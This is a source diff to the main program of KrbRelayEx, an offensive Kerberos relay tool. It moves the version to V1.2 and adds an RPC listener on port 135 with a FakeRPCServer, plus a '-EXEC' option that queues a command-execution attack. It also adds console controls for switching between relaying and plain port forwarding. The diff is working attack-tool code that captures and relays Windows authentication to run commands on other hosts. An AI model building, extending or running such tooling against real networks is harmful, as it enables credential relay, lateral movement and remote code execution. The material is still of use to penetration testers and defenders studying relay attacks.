@@ -28,6 +28,9 @@ using static KrbRelay.Natives;
 
 using static System.Runtime.InteropServices.JavaScript.JSType;
 using KrbRelay.Clients.Attacks.Smb;
+using System.ComponentModel.Design;
+using Utilities;
+using KrbRelayEx.Misc;
 namespace KrbRelay
 {
 
@@ -39,12 +42,13 @@ namespace KrbRelay
     internal class Program
     {
 
-        public const string Version = "V1.1";
+        public const string Version = "V1.2";
         public static string DcomHost = "";
         public static string RedirectHost = "";
         public static string FakeSPN = "";
         public static int SmbListenerPort = 445;
         public static int DcomListenerPort = 9999;
+        public static int RpcListenerPort = 135;
         public static string service = "";
         public static string[] RedirectPorts = null;
         public static byte[] AssocGroup = new byte[4];
@@ -232,6 +236,10 @@ byte[] securityBlob = new byte[securityBufferLength];
             Console.WriteLine("################################################################################");
 
         }
+        private static void ShowCommands()
+        {
+            Console.WriteLine("[*] Hit:\r\n\t=> 'q' to quit,\r\n\t=> 'r' for restarting Relaying and Port Forwarding,\r\n\t=> 's' for Forward Only\r\n\t=> 'l' for listing connected clients");
+        }
         private static void ShowHelp()
         {
 
@@ -353,9 +361,9 @@ byte[] securityBlob = new byte[securityBufferLength];
                     case "/SMBPORT":
                         SmbListenerPort = int.Parse(args[entry.index + 1]);
                         break;
-                    case "-DCOMPORT":
-                    case "/DCOMPORT":
-                        DcomListenerPort = int.Parse(args[entry.index + 1]);
+                    case "-RPCPORT":
+                    case "/RPCPORT":
+                        RpcListenerPort = int.Parse(args[entry.index + 1]);
                         break;
                     case "-BGCONSOLESTARTPORT":
                     case "/BGCONSOLESTARTPORT":
@@ -420,7 +428,21 @@ byte[] securityBlob = new byte[securityBufferLength];
                         }
                         break;
 
-                    
+                    case "-EXEC":
+                    case "/EXEC":
+                        try
+                        {
+                            //Console.WriteLine(args[entry.index + 1]);
+                          //  if (args[entry.index + 1].StartsWith("/") || args[entry.index + 1].StartsWith("-"))
+                            //    throw new Exception();
+                            attacks.Add("exec", args[entry.index + 1]);
+                        }
+                        catch
+                        {
+                            attacks.Add("exec", "");
+                        }
+                        break;
+
                     case "-SERVICE-ADD":
                     case "/SERVICE-ADD":
                         try
@@ -570,35 +592,48 @@ byte[] securityBlob = new byte[securityBufferLength];
              SMBtcpFwd = new FakeSMBServer(SmbListenerPort, RedirectHost, 445, "SMB");
             forwdardmode = false;
             SMBtcpFwd.Start(false);
-           
-            List<FakeSMBServer> tcpForwarders = new List<FakeSMBServer>();
+
+            List<PortForwarder> tcpForwarders = new List<PortForwarder>();
+            FakeRPCServer rpcForwarder;
 
             if (RedirectPorts != null)
             {
                 foreach (string item in RedirectPorts)
                 {
 
-                    tcpForwarders.Add(new FakeSMBServer(int.Parse(item), RedirectHost, int.Parse(item),item));
+                    if (item != RpcListenerPort.ToString())
+                        tcpForwarders.Add(new PortForwarder(int.Parse(item), RedirectHost, int.Parse(item)));
+                    else
+                    {
+                        rpcForwarder = new FakeRPCServer(int.Parse(item), RedirectHost, int.Parse(item), item);
+                        rpcForwarder.Start(true);
+                    }
+
                 }
-                foreach (FakeSMBServer item in tcpForwarders)
+                foreach (PortForwarder item in tcpForwarders)
                 {
-                    item.Start(true);
+                    item.StartAsync();
                 }
             }
 
           
             Console.WriteLine("[*] KrbRelayEx started");
-            
 
-            Console.WriteLine("[*] Hit 'q' for quit, 'r' for restarting Relaying and Port Forwarding, 'l' for listing connected clients");
+
+            ShowCommands();
 
             while (true)
             {
-
+                
                 if (Console.KeyAvailable)
                 {
 
                     ConsoleKeyInfo key = Console.ReadKey(intercept: true);
+                    if (key.KeyChar == '\n' || key.KeyChar == '\r')
+                    {
+                        ShowCommands();
+
+                    }
                     if (key.KeyChar == 'q')
                         return;
 
@@ -608,18 +643,32 @@ byte[] securityBlob = new byte[securityBufferLength];
 
                     }
 
+                    if (key.KeyChar == 'b')
+                    {
+                        bgconsole = !bgconsole;
+                        Console.WriteLine("[!] Background SMB console mode:{0}", bgconsole);
+                    }
                     if (key.KeyChar == 'r')
                     {
-                        Console.WriteLine("[!] Restarting Relay...");
+                        Console.WriteLine("[!] Restarting in Relay mode...");
 
                         SMBtcpFwd.Stop();
                         forwdardmode = false;
                         SMBtcpFwd.Start(false);
 
                     }
-                    
+                    if (key.KeyChar == 's')
+                    {
+                        Console.WriteLine("[!] Restarting in Forward mode...");
+
+                        SMBtcpFwd.Stop();
+                        forwdardmode = true;
+                        SMBtcpFwd.Start(true);
+
+                    }
+
                 }
-                Thread.Sleep(500);
+                Thread.Sleep(300);
             }
 
         }
